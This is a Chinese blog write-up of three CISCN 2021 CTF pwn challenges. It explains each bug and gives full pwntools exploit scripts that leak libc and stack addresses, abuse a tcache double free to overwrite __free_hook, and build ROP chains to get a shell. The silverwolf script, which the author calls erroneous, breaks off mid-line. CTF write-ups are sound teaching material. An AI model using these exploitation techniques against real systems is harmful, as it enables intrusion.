@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ciscn2021西北部分pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2021西北部分pwn">
+<meta property="og:url" content="http://example.com/2021/06/11/ciscn2021%E8%A5%BF%E5%8C%97%E9%83%A8%E5%88%86pwn/index.html">
+<meta property="og:site_name" content="ABf1ag&#39;s blog">
+<meta property="og:description" content="ciscn2021西北部分pwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103321112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103433638.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103442991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103517471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103539633.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210516103143646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021051610413850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-06-11T01:41:15.000Z">
+<meta property="article:modified_time" content="2021-06-11T01:42:26.409Z">
+<meta property="article:author" content="ABf1ag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210516103321112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2021/06/11/ciscn2021%E8%A5%BF%E5%8C%97%E9%83%A8%E5%88%86pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ciscn2021西北部分pwn | ABf1ag's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ABf1ag's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-fw fa-calendar"></i>Schedule</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/11/ciscn2021%E8%A5%BF%E5%8C%97%E9%83%A8%E5%88%86pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ABf1ag">
+      <meta itemprop="description" content="CTF to learn,not learn to CTF">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ABf1ag's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ciscn2021西北部分pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-06-11 09:41:15 / Modified: 09:42:26" itemprop="dateCreated datePublished" datetime="2021-06-11T09:41:15+08:00">2021-06-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> <strong>ciscn2021西北部分pwn</strong></p>
+<span id="more"></span>
+
+<p><em>打了一天的国赛，发现自己还是太菜了</em></p>
+<h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>读取随机数到bss段上作为文件描述符范围在0~0xff之间，又在自定义的函数sub_ba0中发现可以根据偏移进行任意写的操作，sub_b20可以根据偏移进行任意读操作，因此就可以覆盖fd的值，爆破fd使其等于0，我们就可以进行任意读写</p>
+<p> <img src="https://img-blog.csdnimg.cn/20210516103321112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103433638.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103442991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210516103517471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们可以通过泄露出bss段上的stdout指针指向的_IO_2_1_stdout_的地址来泄露libc的基地址，在通过泄露data段上的off_202008来泄露bss段上的地址，再通过libc上的environ来泄露栈地址。<br> <img src="https://img-blog.csdnimg.cn/20210516103539633.png" alt="在这里插入图片描述"><br>因此就可以通过偏移将onegadget直接写入栈上的返回地址中，获得shell。</p>
+<p><strong>用爆破调试有点麻烦，发现可以修改二进制程序，将fd直接改成0再进行调试。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">exp如下：</span><br><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwny&#x27;)</span><br><span class="line">#io=remote(&#x27;124.70.20.79&#x27;,22270)</span><br><span class="line">elf=ELF(&#x27;./pwny&#x27;)</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    io.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    io.send(&#x27;1 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line"></span><br><span class="line">def write(a1):</span><br><span class="line">    io.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    io.send(&#x27;2 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.send(str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    write(256)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    read()</span><br><span class="line">    #io.send(&#x27;-64\n&#x27;)</span><br><span class="line">    io.send(&#x27;\xF8\xFF\xFF\xFF\xFF\xFF\xFF\xff&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    stdout=int(io.recv(12),16)</span><br><span class="line">    print(hex(stdout))</span><br><span class="line">    libcbase = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    stderr=libcbase+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]</span><br><span class="line">    binsh=libcbase+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    environ=libcbase+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line">    onegadget=[0x4f3d5,0x4f432,0x10a41c]</span><br><span class="line">    #onegadget=[0x4f365,0x4f3c2,0x10a45c]</span><br><span class="line">    #offset=(environ-(bss_addr+0x60))//8</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    read()</span><br><span class="line">    io.send(&#x27;\xf5\xff\xff\xff\xff\xff\xff\xff&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    bss_addr=int(io.recv(12),16)-8</span><br><span class="line">    print(hex(bss_addr))</span><br><span class="line"></span><br><span class="line">    read()</span><br><span class="line">    offset=(environ-(bss_addr+0x60))//8</span><br><span class="line">    io.send(p64(offset))</span><br><span class="line">    io.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">    stack=int(io.recv(12),16)</span><br><span class="line">    print(hex(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret_addr=stack-0x120</span><br><span class="line">    offset=((ret_addr-(bss_addr+0x60))//8)</span><br><span class="line"></span><br><span class="line">    write(offset)</span><br><span class="line">    payload=p64(libcbase+onegadget[2])</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    #io.sendline()</span><br><span class="line"></span><br><span class="line">#exp()</span><br><span class="line">i=0</span><br><span class="line">while(i!=100):</span><br><span class="line">    try:</span><br><span class="line">        #io=remote(&#x27;124.70.20.79&#x27;,22270)</span><br><span class="line">        io=process(&#x27;./pwny&#x27;)</span><br><span class="line">        i+=1</span><br><span class="line">        exp()</span><br><span class="line">    except:</span><br><span class="line">        i+=1</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><p>常规的菜单题<br>发现漏洞在dele中对free后的指针没有置0<br><img src="https://img-blog.csdnimg.cn/20210516103143646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>通过doublefree泄露heap_base控制fd指针来控制tcache_struct，将0x250对应的counts改为\xff在freetcache_struct来泄露libcbase的基地址，最后再通过doublefree修改fd指针为__free_hook-0x8(__free_hook-0x10前8个字节不知道为啥修改不了)，在__free_hook-0x8出填上/bin/sh\x00，在__free_hook填上system地址，dele（0）,拿到shell。但在打远程的时候，发现报出了doublefree漏洞，将第一次free后的tcache的fd和bk指针置0，在free就行了。</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./lonelywolf&#x27;)</span><br><span class="line">io=remote(&#x27;124.70.20.79&#x27;,22175)</span><br><span class="line">#elf=ELF(&#x27;./lonelywolf&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc-2.271.so&#x27;)</span><br><span class="line">#context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,96)#0 0x60</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    #print(io.recv(6))</span><br><span class="line">    heapbase=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x260</span><br><span class="line">    #heapbase=int(io.recv(14),16)</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,96)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,96)#tcache</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x20+&#x27;\xff&#x27;*0x8)</span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libcbase=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook=libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    add(0,120)#0x30</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x40)</span><br><span class="line">    #pause()</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(free_hook-0x8)+p64(0))</span><br><span class="line">    add(0,120)</span><br><span class="line">    add(0,120)</span><br><span class="line">    edit(0,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">    pause()</span><br><span class="line">    dele(0)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><p>是个沙箱堆题，libc2.27，第一次做，发现程序逻辑和上个题一样，知识不能用system，但可以使用open、read、write。思路就是利用libc中的environ将chunk申请到栈上，再覆盖返回地址构造rop（这种思路实现起来有点困难，因为chunk可写的大小最大时0x78），但在调试时发现一进入open函数就报错，我猜测是因为libc中的open函数是open64，所以不能绕过沙箱，先放上我的错误exp（<strong>希望哪位大佬可以帮我调试下，帮帮我这个小菜鸡</strong>）（问题已解决，感谢  KANGEL12 师傅的提醒。），后续补上正确的exp。<br><img src="https://img-blog.csdnimg.cn/2021051610413850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./silverwolf&#x27;)</span><br><span class="line">#io=remote(&#x27;124.70.20.79&#x27;,22220)</span><br><span class="line">elf=ELF(&#x27;./silverwolf&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">#pop_rdi=0x215bf</span><br><span class="line">#pop_rsi=0x23ee</span><br><span class="line">#pop_rdx=0x1b96</span><br><span class="line">#pop_rdx_rsi=0x130569</span><br><span class="line"></span><br><span class="line">pop_rax=0x43a78</span><br><span class="line">pop_rdx_rsi=0x130889</span><br><span class="line">pop_rdi=0x2155f</span><br><span class="line">pop_rsi=0x23e8a</span><br><span class="line">pop_rdx=0x1b96</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;Your choice: &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,80)#0 0x50</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    #print(io.recv(6))</span><br><span class="line">    heapbase=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x1880</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,80)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,88)#tcache</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*6+&#x27;\x01&#x27;+&#x27;\x00&#x27;*(0x20-7)+&#x27;\xff&#x27;*0x8+&#x27;\x00&#x27;*0x2f)</span><br><span class="line">    add(0,120)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x40))</span><br><span class="line">    add(0,120)</span><br><span class="line">    add(0,120)#tcache+0x40</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x70)</span><br><span class="line"></span><br><span class="line">    add(0,96)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,96)</span><br><span class="line">    add(0,96)#tcache</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: 